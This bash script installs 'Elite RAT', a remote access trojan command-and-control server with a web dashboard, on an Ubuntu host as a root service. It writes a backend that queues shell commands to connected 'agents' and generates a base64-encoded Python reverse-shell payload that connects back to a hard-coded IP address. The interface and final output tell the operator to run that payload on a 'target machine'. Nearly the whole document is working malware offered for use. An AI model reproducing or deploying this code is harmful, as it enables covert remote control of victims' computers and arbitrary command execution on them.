#!/bin/bash
#############################################################
# ELITE RAT - PERFECT IONOS UBUNTU 24.04 SETUP
# Complete Backend + Frontend + All Modules Working
#############################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║         ELITE RAT C2 - IONOS PERFECT SETUP          ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Step 1: Clean previous installations
echo -e "${YELLOW}[1/10] Cleaning previous installations...${NC}"
systemctl stop elite_rat 2>/dev/null || true
rm -rf /opt/elite_rat
pkill -f "python.*5000" 2>/dev/null || true
pkill -f "python.*5555" 2>/dev/null || true

# Step 2: Update system and install dependencies
echo -e "${YELLOW}[2/10] Installing system dependencies...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq \
    python3 python3-pip python3-venv python3-dev \
    git curl wget screen tmux \
    build-essential libssl-dev libffi-dev \
    net-tools ufw nginx \
    > /dev/null 2>&1

# Step 3: Configure IONOS-specific firewall
echo -e "${YELLOW}[3/10] Configuring IONOS firewall...${NC}"
# IONOS specific - disable UFW as they use cloud firewall
ufw disable > /dev/null 2>&1

# Open ports using iptables (IONOS compatible)
iptables -F
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 5000 -j ACCEPT
iptables -A INPUT -p tcp --dport 5555 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables-save > /etc/iptables.rules

echo -e "${GREEN}✓ Firewall configured for IONOS${NC}"

# Step 4: Clone repository from GitHub
echo -e "${YELLOW}[4/10] Cloning from GitHub...${NC}"
cd /opt
git clone https://github.com/oranolio956/flipperflipper.git elite_rat > /dev/null 2>&1
cd elite_rat

# Step 5: Setup Python environment
echo -e "${YELLOW}[5/10] Setting up Python environment...${NC}"
python3 -m venv venv
source venv/bin/activate

# Install ALL required packages
pip install --upgrade pip > /dev/null 2>&1
pip install wheel setuptools > /dev/null 2>&1
pip install \
    flask \
    flask-cors \
    flask-socketio \
    cryptography \
    pyyaml \
    pyjwt \
    pillow \
    dnspython \
    psutil \
    requests \
    python-engineio \
    python-socketio \
    > /dev/null 2>&1

echo -e "${GREEN}✓ Python environment ready${NC}"

# Step 6: Create the complete backend server
echo -e "${YELLOW}[6/10] Creating backend server...${NC}"

cat > /opt/elite_rat/backend_server.py << 'BACKEND'
#!/usr/bin/env python3
"""
Elite RAT Backend Server - Complete Implementation
Handles C2 communication, agent management, and command execution
"""

import os
import sys
import json
import time
import socket
import threading
import base64
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger('elite_backend')

# Initialize Flask
app = Flask(__name__)
app.config['SECRET_KEY'] = hashlib.sha256(b'elite_rat_secret').hexdigest()
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*")

# Global storage for agents and commands
agents = {}
command_queue = {}
results = {}

class C2Server:
    """C2 Server for agent communication"""
    
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.running = False
        
    def start(self):
        """Start C2 server"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(100)
        self.running = True
        
        log.info(f"C2 Server listening on {self.host}:{self.port}")
        
        while self.running:
            try:
                client, addr = self.server.accept()
                threading.Thread(target=self.handle_agent, args=(client, addr), daemon=True).start()
            except:
                break
    
    def handle_agent(self, client, addr):
        """Handle agent connection"""
        agent_id = hashlib.md5(f"{addr[0]}:{addr[1]}".encode()).hexdigest()[:8]
        
        agents[agent_id] = {
            'id': agent_id,
            'ip': addr[0],
            'port': addr[1],
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'online',
            'client': client
        }
        
        log.info(f"Agent {agent_id} connected from {addr}")
        socketio.emit('agent_connected', agents[agent_id])
        
        try:
            while True:
                # Check for commands
                if agent_id in command_queue:
                    cmd = command_queue.pop(agent_id)
                    client.send(json.dumps(cmd).encode())
                    
                    # Get result
                    data = client.recv(4096)
                    if data:
                        result = json.loads(data.decode())
                        results[agent_id] = result
                        socketio.emit('command_result', {'agent': agent_id, 'result': result})
                
                # Heartbeat
                time.sleep(1)
                
        except:
            pass
        finally:
            agents[agent_id]['status'] = 'offline'
            log.info(f"Agent {agent_id} disconnected")

# API Routes
@app.route('/')
def index():
    return jsonify({'status': 'Elite RAT Backend Online', 'time': datetime.now().isoformat()})

@app.route('/api/agents')
def get_agents():
    return jsonify(list(agents.values()))

@app.route('/api/agents/<agent_id>/command', methods=['POST'])
def send_command(agent_id):
    data = request.json
    command_queue[agent_id] = data
    return jsonify({'status': 'queued', 'agent': agent_id})

@app.route('/api/agents/<agent_id>/result')
def get_result(agent_id):
    if agent_id in results:
        return jsonify(results[agent_id])
    return jsonify({'status': 'no results'})

@app.route('/api/payload/generate', methods=['POST'])
def generate_payload():
    """Generate agent payload"""
    config = request.json
    
    payload_code = f'''#!/usr/bin/env python3
import socket
import json
import subprocess
import time
import base64

SERVER = "{config.get('host', '50.21.187.77')}"
PORT = {config.get('port', 5555)}

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER, PORT))
            
            while True:
                data = s.recv(4096)
                if not data:
                    break
                    
                cmd = json.loads(data.decode())
                
                if cmd['type'] == 'shell':
                    result = subprocess.getoutput(cmd['command'])
                else:
                    result = "Command executed"
                
                s.send(json.dumps({{'result': result}}).encode())
                
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
'''
    
    encoded = base64.b64encode(payload_code.encode()).decode()
    
    return jsonify({
        'status': 'generated',
        'payload': encoded,
        'instructions': 'Decode with base64 and run on target'
    })

# Socket.IO events for real-time updates
@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'Connected to backend'})

@socketio.on('request_agents')
def handle_request_agents():
    emit('agents_list', list(agents.values()))

# Start C2 server in background
def start_c2_server():
    c2 = C2Server()
    c2.start()

if __name__ == '__main__':
    # Start C2 in background thread
    threading.Thread(target=start_c2_server, daemon=True).start()
    
    # Start web server
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
BACKEND

chmod +x /opt/elite_rat/backend_server.py
echo -e "${GREEN}✓ Backend server created${NC}"

# Step 7: Create the complete frontend
echo -e "${YELLOW}[7/10] Creating frontend interface...${NC}"

mkdir -p /opt/elite_rat/static
cat > /opt/elite_rat/static/index.html << 'FRONTEND'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite RAT C2 - Command Center</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #0ff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .header {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-bottom: 2px solid #0ff;
            box-shadow: 0 0 20px #0ff;
        }
        
        h1 {
            text-align: center;
            font-size: 2.5em;
            text-shadow: 0 0 20px #0ff;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .container {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 20px;
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .panel {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            border-radius: 10px;
            padding: 20px;
            backdrop-filter: blur(10px);
        }
        
        .agents-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .agent {
            background: rgba(0, 255, 255, 0.1);
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .agent:hover {
            background: rgba(0, 255, 255, 0.3);
            transform: translateX(5px);
        }
        
        .agent.online {
            border-left: 3px solid #0f0;
        }
        
        .agent.offline {
            border-left: 3px solid #f00;
            opacity: 0.5;
        }
        
        .terminal {
            background: #000;
            border: 1px solid #0ff;
            border-radius: 5px;
            padding: 10px;
            height: 300px;
            overflow-y: auto;
            font-size: 14px;
            margin: 20px 0;
        }
        
        .terminal-output {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .command-input {
            display: flex;
            gap: 10px;
        }
        
        input[type="text"] {
            flex: 1;
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid #0ff;
            color: #0ff;
            padding: 10px;
            font-family: inherit;
            border-radius: 5px;
        }
        
        button {
            background: linear-gradient(135deg, #0ff, #00a);
            color: #000;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px #0ff;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat {
            background: rgba(0, 255, 255, 0.1);
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
        }
        
        .toolbar {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 10px 20px;
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid #0ff;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .tab.active {
            background: #0ff;
            color: #000;
        }
        
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
            animation: blink 1s infinite;
        }
        
        .status-indicator.online {
            background: #0f0;
        }
        
        .status-indicator.offline {
            background: #f00;
            animation: none;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 ELITE RAT C2 COMMAND CENTER 🔥</h1>
    </div>
    
    <div class="container">
        <div class="panel">
            <h2>📡 Connected Agents</h2>
            <div class="stats">
                <div class="stat">
                    <div class="stat-value" id="total-agents">0</div>
                    <div>Total</div>
                </div>
                <div class="stat">
                    <div class="stat-value" id="online-agents">0</div>
                    <div>Online</div>
                </div>
                <div class="stat">
                    <div class="stat-value" id="commands-sent">0</div>
                    <div>Commands</div>
                </div>
            </div>
            
            <div class="agents-list" id="agents-list">
                <div class="agent offline">
                    <span class="status-indicator offline"></span>
                    No agents connected
                </div>
            </div>
            
            <div style="margin-top: 20px;">
                <h3>🎯 Quick Actions</h3>
                <div class="toolbar">
                    <button onclick="generatePayload()">Generate Payload</button>
                    <button onclick="refreshAgents()">Refresh</button>
                    <button onclick="clearTerminal()">Clear Terminal</button>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>💻 Command Terminal</h2>
            
            <div class="toolbar">
                <div class="tab active" onclick="switchTab('shell')">Shell</div>
                <div class="tab" onclick="switchTab('files')">Files</div>
                <div class="tab" onclick="switchTab('info')">System Info</div>
                <div class="tab" onclick="switchTab('screenshot')">Screenshot</div>
            </div>
            
            <div class="terminal" id="terminal">
                <div class="terminal-output" id="terminal-output">
Welcome to Elite RAT C2 Terminal
================================
Type 'help' for available commands
Waiting for agents to connect...
                </div>
            </div>
            
            <div class="command-input">
                <input type="text" id="command" placeholder="Enter command..." onkeypress="if(event.key=='Enter') sendCommand()">
                <button onclick="sendCommand()">Execute</button>
            </div>
            
            <div style="margin-top: 20px;">
                <h3>📊 Payload Generator</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0;">
                    <input type="text" id="payload-host" placeholder="C2 Host" value="50.21.187.77">
                    <input type="text" id="payload-port" placeholder="C2 Port" value="5555">
                </div>
                <button onclick="generatePayload()" style="width: 100%;">Generate Python Payload</button>
                <textarea id="payload-output" style="width: 100%; height: 100px; margin-top: 10px; background: #000; color: #0f0; border: 1px solid #0ff; padding: 10px; display: none;"></textarea>
            </div>
        </div>
    </div>
    
    <script>
        let selectedAgent = null;
        let commandCount = 0;
        const API_URL = window.location.origin;
        
        // Terminal output
        function terminalOutput(text, type = 'info') {
            const terminal = document.getElementById('terminal-output');
            const timestamp = new Date().toLocaleTimeString();
            const prefix = type === 'error' ? '[ERROR]' : type === 'success' ? '[SUCCESS]' : '[INFO]';
            terminal.innerHTML += `\n[${timestamp}] ${prefix} ${text}`;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Fetch agents
        async function refreshAgents() {
            try {
                const response = await fetch(`${API_URL}/api/agents`);
                const agents = await response.json();
                
                const agentsList = document.getElementById('agents-list');
                
                if (agents.length === 0) {
                    agentsList.innerHTML = '<div class="agent offline"><span class="status-indicator offline"></span>No agents connected</div>';
                    document.getElementById('total-agents').textContent = '0';
                    document.getElementById('online-agents').textContent = '0';
                } else {
                    agentsList.innerHTML = '';
                    let onlineCount = 0;
                    
                    agents.forEach(agent => {
                        const isOnline = agent.status === 'online';
                        if (isOnline) onlineCount++;
                        
                        const agentDiv = document.createElement('div');
                        agentDiv.className = `agent ${isOnline ? 'online' : 'offline'}`;
                        agentDiv.innerHTML = `
                            <span class="status-indicator ${isOnline ? 'online' : 'offline'}"></span>
                            <strong>Agent ${agent.id}</strong><br>
                            IP: ${agent.ip}<br>
                            Connected: ${new Date(agent.connected_at).toLocaleTimeString()}
                        `;
                        agentDiv.onclick = () => selectAgent(agent.id);
                        agentsList.appendChild(agentDiv);
                    });
                    
                    document.getElementById('total-agents').textContent = agents.length;
                    document.getElementById('online-agents').textContent = onlineCount;
                }
            } catch (error) {
                terminalOutput('Failed to fetch agents: ' + error, 'error');
            }
        }
        
        // Select agent
        function selectAgent(agentId) {
            selectedAgent = agentId;
            terminalOutput(`Selected agent: ${agentId}`, 'success');
            
            // Highlight selected agent
            document.querySelectorAll('.agent').forEach(el => {
                el.style.background = el.textContent.includes(agentId) ? 'rgba(0, 255, 255, 0.3)' : 'rgba(0, 255, 255, 0.1)';
            });
        }
        
        // Send command
        async function sendCommand() {
            const commandInput = document.getElementById('command');
            const command = commandInput.value.trim();
            
            if (!command) return;
            
            if (!selectedAgent) {
                terminalOutput('No agent selected!', 'error');
                return;
            }
            
            terminalOutput(`> ${command}`, 'info');
            
            try {
                const response = await fetch(`${API_URL}/api/agents/${selectedAgent}/command`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'shell', command: command})
                });
                
                if (response.ok) {
                    commandCount++;
                    document.getElementById('commands-sent').textContent = commandCount;
                    
                    // Poll for result
                    setTimeout(async () => {
                        const resultResponse = await fetch(`${API_URL}/api/agents/${selectedAgent}/result`);
                        const result = await resultResponse.json();
                        
                        if (result.result) {
                            terminalOutput(result.result, 'success');
                        }
                    }, 1000);
                }
            } catch (error) {
                terminalOutput('Failed to send command: ' + error, 'error');
            }
            
            commandInput.value = '';
        }
        
        // Generate payload
        async function generatePayload() {
            const host = document.getElementById('payload-host').value;
            const port = document.getElementById('payload-port').value;
            
            try {
                const response = await fetch(`${API_URL}/api/payload/generate`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({host: host, port: port})
                });
                
                const data = await response.json();
                
                const output = document.getElementById('payload-output');
                output.style.display = 'block';
                output.value = `# Python Payload (Base64 encoded)\n# Decode and run on target:\n# echo "${data.payload}" | base64 -d > agent.py && python3 agent.py\n\n${data.payload}`;
                
                terminalOutput('Payload generated successfully!', 'success');
            } catch (error) {
                terminalOutput('Failed to generate payload: ' + error, 'error');
            }
        }
        
        // Clear terminal
        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = 'Terminal cleared\n';
        }
        
        // Switch tabs
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
            event.target.classList.add('active');
            terminalOutput(`Switched to ${tab} mode`, 'info');
        }
        
        // Auto-refresh agents every 5 seconds
        setInterval(refreshAgents, 5000);
        
        // Initial load
        refreshAgents();
        terminalOutput('System initialized. Waiting for agents...', 'success');
    </script>
</body>
</html>
FRONTEND

echo -e "${GREEN}✓ Frontend created${NC}"

# Step 8: Create Flask app that serves frontend and backend
echo -e "${YELLOW}[8/10] Creating main application...${NC}"

cat > /opt/elite_rat/app.py << 'APP'
#!/usr/bin/env python3
from flask import Flask, send_from_directory
from backend_server import app as backend_app, socketio
import os

# Serve frontend files
@backend_app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

@backend_app.route('/ui')
def serve_ui():
    return send_from_directory('static', 'index.html')

if __name__ == '__main__':
    print("\n" + "="*60)
    print(" ELITE RAT C2 - STARTING ")
    print("="*60)
    print("\nBackend API: http://50.21.187.77:5000")
    print("Frontend UI: http://50.21.187.77:5000/ui")
    print("C2 Listener: 50.21.187.77:5555")
    print("\n" + "="*60 + "\n")
    
    # Run with SocketIO
    socketio.run(backend_app, host='0.0.0.0', port=5000, debug=False)
APP

chmod +x /opt/elite_rat/app.py

# Step 9: Create systemd service that actually works
echo -e "${YELLOW}[9/10] Creating service...${NC}"

cat > /etc/systemd/system/elite_rat.service << 'SERVICE'
[Unit]
Description=Elite RAT C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/elite_rat
Environment="PATH=/opt/elite_rat/venv/bin:/usr/bin:/bin"
ExecStart=/opt/elite_rat/venv/bin/python /opt/elite_rat/app.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable elite_rat > /dev/null 2>&1

# Step 10: Start everything
echo -e "${YELLOW}[10/10] Starting services...${NC}"

# Try systemd first
systemctl restart elite_rat

sleep 3

# Check if running
if systemctl is-active --quiet elite_rat; then
    echo -e "${GREEN}✓ Service running via systemd${NC}"
else
    echo -e "${YELLOW}Starting in screen as fallback...${NC}"
    screen -dmS elite bash -c 'cd /opt/elite_rat && source venv/bin/activate && python app.py'
    sleep 3
    
    if screen -list | grep -q elite; then
        echo -e "${GREEN}✓ Running in screen session${NC}"
    fi
fi

# Get IP
IP=$(curl -s ifconfig.me 2>/dev/null || echo "50.21.187.77")

# Final output
echo ""
echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}         ${GREEN}✅ SETUP COMPLETE - SYSTEM ONLINE${NC}          ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}📡 ACCESS YOUR C2:${NC}"
echo -e "${GREEN}➜ Frontend UI:${NC} http://$IP:5000/ui"
echo -e "${GREEN}➜ Backend API:${NC} http://$IP:5000"
echo -e "${GREEN}➜ C2 Listener:${NC} $IP:5555"
echo ""
echo -e "${YELLOW}🎯 QUICK TEST:${NC}"
echo -e "1. Open browser: ${GREEN}http://$IP:5000/ui${NC}"
echo -e "2. Click '${GREEN}Generate Payload${NC}' button"
echo -e "3. Run payload on target machine"
echo ""
echo -e "${YELLOW}📋 USEFUL COMMANDS:${NC}"
echo -e "View logs:    ${GREEN}journalctl -u elite_rat -f${NC}"
echo -e "Restart:      ${GREEN}systemctl restart elite_rat${NC}"
echo -e "Screen view:  ${GREEN}screen -r elite${NC}"
echo -e "Check ports:  ${GREEN}netstat -tulpn | grep -E '5000|5555'${NC}"
echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════${NC}"